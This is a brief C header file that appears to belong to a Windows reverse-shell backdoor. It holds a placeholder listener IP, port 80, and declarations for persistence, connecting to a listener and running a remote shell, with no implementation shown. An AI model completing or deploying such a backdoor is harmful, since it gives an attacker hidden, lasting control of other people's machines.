#ifndef MAIN_H
#define MAIN_H

#define SERVER_IP "Your_IP"
#define SERVER_PORT 80

void create_persistence();
void connect_to_listener(SOCKET *sock);
void run_shell(SOCKET sock);

#endif // MAIN_H
